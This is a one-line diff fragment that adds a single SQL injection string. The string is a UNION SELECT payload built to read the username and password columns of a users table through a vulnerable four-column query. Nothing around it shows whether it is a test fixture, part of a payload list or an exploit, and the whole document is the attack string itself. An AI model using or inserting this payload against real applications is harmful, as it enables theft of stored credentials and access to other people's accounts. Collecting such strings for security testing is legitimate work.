@@ -1,0 +1,1 @@
+' UNION SELECT 1, username, password, 9.99 FROM users -- 
